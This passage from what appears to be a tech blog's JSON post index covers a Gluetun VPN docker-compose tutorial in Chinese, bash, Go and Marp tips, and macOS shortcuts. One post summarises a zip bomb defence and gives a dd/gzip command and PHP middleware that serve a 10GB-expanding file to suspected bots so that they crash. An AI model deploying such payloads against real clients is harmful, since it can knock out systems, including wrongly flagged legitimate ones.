style=\"color:#ae81ff\"\u003egluetun\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003erestart\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eunless-stopped\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003ecap_add\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eNET_ADMIN\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003edevices\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e/dev/net/tun:/dev/net/tun\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eports\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e8888\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e8888\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e/tcp\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# HTTP proxy\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e8388\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e8388\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e/tcp\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# Shadowsocks\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e8388\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e8388\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e/udp\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# Shadowsocks\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003evolumes\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e/home/user/gluetun:/gluetun\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eenvironment\u003c/span\u003e: \u003cspan style=\"color:#75715e\"\u003e# 按照VPN供應商的OpenVPN設定檔填寫\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eVPN_SERVICE_PROVIDER=protonvpn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eVPN_TYPE=openvpn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eOPENVPN_USER=\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# OpenVPN帳號\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eOPENVPN_PASSWORD=\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# OpenVPN密碼\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eSERVER_COUNTRIES=United Kingdom\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# 指定伺服器所在國家，以逗號分隔\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e     \u003cspan style=\"color:#f92672\"\u003enetworks\u003c/span\u003e: \u003cspan style=\"color:#75715e\"\u003e# (選擇性) 固定Gluetun容器的IP\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       \u003cspan style=\"color:#f92672\"\u003enetwork\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eipv4_address\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e172.27.0.5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003enetworks\u003c/span\u003e: \u003cspan style=\"color:#75715e\"\u003e# (選擇性) 固定Gluetun容器的IP\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003enetwork\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003edriver\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ebridge\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eipam\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003econfig\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        - \u003cspan style=\"color:#f92672\"\u003esubnet\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e172.27.0.0\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e/16\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#f92672\"\u003egateway\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e172.27.0.5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eWireGuard\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-yaml\" data-lang=\"yaml\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eservices\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003egluetun\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eimage\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eqmcgaw/gluetun\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003econtainer_name\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003egluetun\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003erestart\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003eunless-stopped\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003ecap_add\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eNET_ADMIN\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003edevices\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e/dev/net/tun:/dev/net/tun\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eports\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e8888\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e8888\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e/tcp\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# HTTP proxy\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e8388\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e8388\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e/tcp\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# Shadowsocks\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e8388\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e8388\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e/udp\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# Shadowsocks\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003evolumes\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003e/home/user/gluetun:/gluetun\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eenvironment\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eVPN_SERVICE_PROVIDER=protonvpn\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# 按照VPN供應商的WireGuard設定檔填寫\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eVPN_TYPE=wireguard\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eWIREGUARD_PRESHARED_KEY=\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# 預共享密鑰\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eWIREGUARD_PRIVATE_KEY=\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# 私鑰\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eWIREGUARD_ADDRESSES=\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# 填IPV4與IPV6位址，以逗號分隔\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      - \u003cspan style=\"color:#ae81ff\"\u003eSERVER_COUNTRIES=United Kingdom\u003c/span\u003e \u003cspan style=\"color:#75715e\"\u003e# 指定伺服器所在國家，以逗號分隔\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e     \u003cspan style=\"color:#f92672\"\u003enetworks\u003c/span\u003e: \u003cspan style=\"color:#75715e\"\u003e# (選擇性) 固定Gluetun容器的IP\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e       \u003cspan style=\"color:#f92672\"\u003enetwork\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#f92672\"\u003eipv4_address\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e172.27.0.5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003enetworks\u003c/span\u003e: \u003cspan style=\"color:#75715e\"\u003e# (選擇性) 固定Gluetun容器的IP\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#f92672\"\u003enetwork\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003edriver\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003ebridge\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eipam\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      \u003cspan style=\"color:#f92672\"\u003econfig\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        - \u003cspan style=\"color:#f92672\"\u003esubnet\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e172.27.0.0\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e/16\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e          \u003cspan style=\"color:#f92672\"\u003egateway\u003c/span\u003e: \u003cspan style=\"color:#ae81ff\"\u003e172.27.0.5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"讓容器走-gluetun-的-vpn-連線\"\u003e讓容器走 Gluetun 的 VPN 連線\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e如果容器服務跟 Gluetun 寫在同一個 docker-compose：加入網路模式 network_mode: \u0026ldquo;service:gluetun\u0026rdquo;\u003c/li\u003e\n\u003cli\u003e如果該容器跟 Gluetun 不是寫在同一個 docker-compose：加入 network_mode: \u0026ldquo;container:gluetun\u0026rdquo;\u003c/li\u003e\n\u003cli\u003e開啟 Gluetun 的 docker-compose 檔案，把 service 用到的通訊埠(ex:8080)加回來\u003c/li\u003e\n\u003cli\u003e依序啟動 Gluetun 和 走 Gluetun 的 VPN 連線的服務\u003c/li\u003e\n\u003cli\u003e容器公共 IP 應當跟您選擇的 VPN 伺服器一致\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Docker","Gluetun","VPN"],"title":"Gluetun：讓Docker容器走VPN連線，沒網路就斷線，使用教學"},{"categories":["URL","Go","Redis","Lua"],"contents":" Go 实战指南：使用 go-redis 执行 Lua 脚本 Redis command Eval Redis package redis.NewScript, script.Run ","date":"July 22, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2025/20250722-go-redis-lua/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.liwenzhou.com/posts/Go/go-redis-lua/\" target=\"_blank\" rel=\"noopener\"\u003eGo 实战指南：使用 go-redis 执行 Lua 脚本\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003col\u003e\n\u003cli\u003eRedis command \u003ccode\u003eEval\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eRedis package \u003ccode\u003eredis.NewScript\u003c/code\u003e, \u003ccode\u003escript.Run\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e","tags":["URL","Go","Redis","Lua"],"title":"Go实战指南：使用 go-redis 执行 Lua 脚本"},{"categories":["URL","BASH","timeout","HTTP"],"contents":" TIL: timeout in Bash scripts\ntimeout 1m ./until.sh\nwrap\ntimeout 1m bash -c \u0026#34;until curl --silent --fail-with-body 10.0.0.1:8080/health; do sleep 1 done\u0026#34; ","date":"June 12, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2025/20250612-bash-timeout/","summary":"\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://heitorpb.github.io/bla/timeout/\" target=\"_blank\" rel=\"noopener\"\u003eTIL: timeout in Bash scripts\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003etimeout 1m ./until.sh\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003ewrap\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etimeout 1m bash -c \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;until curl --silent --fail-with-body 10.0.0.1:8080/health; do\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e\tsleep 1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003edone\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","BASH","timeout","HTTP"],"title":"TIL: timeout in Bash scripts"},{"categories":["URL","Youtube","台語"],"contents":" TaigiTube 台語水管 ","date":"May 8, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2025/20250508-taigitube/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://taigitube.com/\" target=\"_blank\" rel=\"noopener\"\u003eTaigiTube 台語水管\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Youtube","台語"],"title":"TaigiTube 台語水管"},{"categories":["URL","HTTP","Security"],"contents":" I use Zip Bombs to Protect my Server\nWhat happens is, they receive the file, read the header that instructs them that it is a compressed file. So they try to decompress the 1MB file to find whatever content they are looking for. But the file expands, and expands, and expands, until they run out of memory and their server crashes. The 1MB file decompresses into a 1GB. This is more than enough to break most bots. However, for those pesky scripts that won\u0026rsquo;t stop, I serve them the 10MB file. This one decompresses into 10GB and instantly kills the script.\ndd if=/dev/zero bs=1G count=10 | gzip -c \u0026gt; 10GB.gz\ndd: The dd command is used to copy or convert data. if: Input file, specifies /dev/zero a special file that produces an infinite stream of zero bytes. bs: block size, sets the block size to 1 gigabyte (1G), meaning dd will read and write data in chunks of 1 GB at a time. count=10: This tells dd to process 10 blocks, each 1 GB in size. So, this will generate 10 GB of zeroed data. middleware\nif (ipIsBlackListed() || isMalicious()) { header(\u0026#34;Content-Encoding: gzip\u0026#34;); header(\u0026#34;Content-Length: \u0026#34;. filesize(ZIP_BOMB_FILE_10G)); // 10 MB readfile(ZIP_BOMB_FILE_10G); exit; } ","date":"May 3, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2025/20250503-zipbomb-protection/","summary":"\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://idiallo.com/blog/zipbomb-protection\" target=\"_blank\" rel=\"noopener\"\u003eI use Zip Bombs to Protect my Server\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eWhat happens is, they receive the file, read the header that instructs them that it is a compressed file. So they try to decompress the 1MB file to find whatever content they are looking for. But the file expands, and expands, and expands, until they run out of memory and their server crashes. The 1MB file decompresses into a 1GB. This is more than enough to break most bots. However, for those pesky scripts that won\u0026rsquo;t stop, I serve them the 10MB file. This one decompresses into 10GB and instantly kills the script.\u003c/p\u003e","tags":["URL","HTTP","Security"],"title":"I use Zip Bombs to Protect my Server"},{"categories":["URL","Proxy","Web","HTTP","Debug"],"contents":" 人人都需要一個 HTTP proxy 來 debug Charles Burp Suite mitmproxy ","date":"April 25, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2025/20250425-everyone-need-a-http-proxy-to-debug/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://blog.huli.tw/2025/04/23/everyone-need-a-http-proxy-to-debug/\" target=\"_blank\" rel=\"noopener\"\u003e人人都需要一個 HTTP proxy 來 debug\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003col\u003e\n\u003cli\u003e\u003ca href=\"https://www.charlesproxy.com/\" target=\"_blank\" rel=\"noopener\"\u003eCharles\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://portswigger.net/burp/communitydownload\" target=\"_blank\" rel=\"noopener\"\u003eBurp Suite\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://mitmproxy.org/\" target=\"_blank\" rel=\"noopener\"\u003emitmproxy\u003c/a\u003e\u003c/li\u003e\n\u003c/ol\u003e","tags":["URL","Proxy","Web","HTTP","Debug"],"title":"人人都需要一個 HTTP proxy 來 debug"},{"categories":["URL","QRCode"],"contents":" Why are QR Codes with capital letters smaller than QR codes with lower-case letters?\nIf you want the smallest possible physical size for a QR code which contains a URl, make sure the text is all in capital letters.\n","date":"April 23, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2025/20250423-why-are-qr-codes-with-capital-letters-smaller-than-qr-codes-with-lower-case-letters/","summary":"\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ca href=\"https://shkspr.mobi/blog/2025/02/why-are-qr-codes-with-capital-letters-smaller-than-qr-codes-with-lower-case-letters/\" target=\"_blank\" rel=\"noopener\"\u003eWhy are QR Codes with capital letters smaller than QR codes with lower-case letters?\u003c/a\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eIf you want the smallest possible physical size for a QR code which contains a URl, make sure the text is all in capital letters.\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","QRCode"],"title":"Why are QR Codes with capital letters smaller than QR codes with lower-case letters?"},{"categories":["URL","markdown","VScode"],"contents":" Marp 教學：Markdown 搭配 VS Code 做簡報，快速輸出為 PPTX 或 PDF，提昇做簡報效率 Install \u0026lsquo;Marp for VS Code\u0026rsquo; 在 Markdown 最前面的 FrontMatter，插入以下屬性，啟用 Marp，並開啟顯示頁數功能 --- marp:true paginate: true --- Markdown 文字都是直排排列的，需要換行請加上\\。 輸入三條橫線---分隔投影片。 插入註解請用\u0026lt;!-- --\u0026gt;語法。 ","date":"April 8, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2025/20250408-vscode-marp-presentation/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ivonblog.com/posts/vscode-marp-presentation/\" target=\"_blank\" rel=\"noopener\"\u003eMarp 教學：Markdown 搭配 VS Code 做簡報，快速輸出為 PPTX 或 PDF，提昇做簡報效率\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003col\u003e\n\u003cli\u003eInstall \u0026lsquo;Marp for VS Code\u0026rsquo;\u003c/li\u003e\n\u003cli\u003e在 Markdown 最前面的 FrontMatter，插入以下屬性，啟用 Marp，並開啟顯示頁數功能\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e---\nmarp:true\npaginate: true\n---\n\u003c/code\u003e\u003c/pre\u003e\u003col start=\"3\"\u003e\n\u003cli\u003eMarkdown 文字都是直排排列的，需要換行請加上\u003ccode\u003e\\\u003c/code\u003e。\u003c/li\u003e\n\u003cli\u003e輸入三條橫線\u003ccode\u003e---\u003c/code\u003e分隔投影片。\u003c/li\u003e\n\u003cli\u003e插入註解請用\u003ccode\u003e\u0026lt;!-- --\u0026gt;\u003c/code\u003e語法。\u003c/li\u003e\n\u003c/ol\u003e","tags":["URL","markdown","VScode"],"title":"Marp教學：Markdown搭配VS Code做簡報，快速輸出為PPTX或PDF，提昇做簡報效率"},{"categories":["URL","Go","Protobuf"],"contents":" [译]Go Protobuf：新的 Opaque API protoc --proto_path=. \\ --go_out=./ \\ + --go_opt=default_api_level=API_OPAQUE \\ ","date":"April 7, 2025","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/2025/20250407-protobuf-opaque/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://www.liwenzhou.com/posts/Go/protobuf-opaque/\" target=\"_blank\" rel=\"noopener\"\u003e[译]Go Protobuf：新的 Opaque API\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-diff\" data-lang=\"diff\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprotoc --proto_path=. \\\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    --go_out=./ \\\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003e+    --go_opt=default_api_level=API_OPAQUE \\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Go","Protobuf"],"title":"Go Protobuf：新的 Opaque API"},{"categories":["URL","macOS"],"contents":" macOS Tips \u0026amp; Tricks General Native UI Conventions Press ⇧⌘/ to search all of the current app\u0026rsquo;s menu items. Then use the Up/Down arrow keys to navigate the results and press Return to execute that menu bar action. Press ⌃F2 to move keyboard focus to the application\u0026rsquo;s menu bar. Start typing the first few letters of a menu title to jump to that menu. Hold the Option key while expanding an outline view to recursively expand all children. (The easiest place to test this is in Finder\u0026rsquo;s List view.) On modal dialogs/sheets, press Command + the first letter of the button to press that button. ⌘. is the shortcut equivalent of the Escape key. Hold Control and Option while clicking on a window to switch focus to that window without raising it. Hold Command while dragging a toolbar icon to move it to a new position. By default, clicking inside a scroll bar will scroll partially towards the clicked location. Hold Option while clicking in the scroll bar to jump directly to the clicked location. Hold Option while dragging the scroller to slowly scroll. In a scroll view, use the Up/Down keys to scroll in small increments. Hold Option to scroll in larger increments, and hold Command to scroll to the beginning or end. Hold Option while pressing the Page Up/Page Down keys to also move the cursor while scrolling. In a text field that treats the Tab key as an input, press Control-Tab and Control-Shift-Tab to move focus to the previous or next control. Press ⌃⌘D while holding the pointer over a word to view an inline dictionary definition of the word. Press ⌃F6 to move focus to a floating window. To quickly find text, select some text and press ⌘E followed by ⌘G. Press ⌃⌫ to delete only the accent mark from the previous character (e.g. é will become e). In Fonts windows, enter *X to scale the current font size, e.g. *1.5. When entering text, press ⌥⇧K (on U.S. keyboards) to insert an Apple logo. Hold Command while dragging a Picture-in-Picture (PiP) video player to move it anywhere without having it snap to one of the screen corners. Screenshots After pressing ⇧⌘4 and while drawing the screen capture area, hold Option while resizing to resize from the center, and hold Shift while resizing to adjust only one axis. After drawing the area, hold the Space bar and drag to move the selected area. After pressing ⇧⌘4, hold Control while taking the screenshot to copy to the clipboard instead of saving to file. After pressing ⇧⌘4, press the Space bar to select a window to screenshot. Hold down Option while taking the screenshot to remove the window\u0026rsquo;s shadow. Right click on the floating screenshot preview to access additional actions. Open/Save Dialogs Drag a file or folder from Finder into an open/save dialog to jump directly to that file. In save dialogs, press ⌘= to switch between the compact and expanded layout. In save dialogs, press ⌘⌫ to activate the Delete button, ⌘D to activate the Don\u0026rsquo;t Save button, and ⌘. (or Esc) to activate the Cancel button. Press ~ to open a Go To File dialog prefilled with the home directory. Press / to open it prefilled with the root directory. Press ⌘R to reveal the 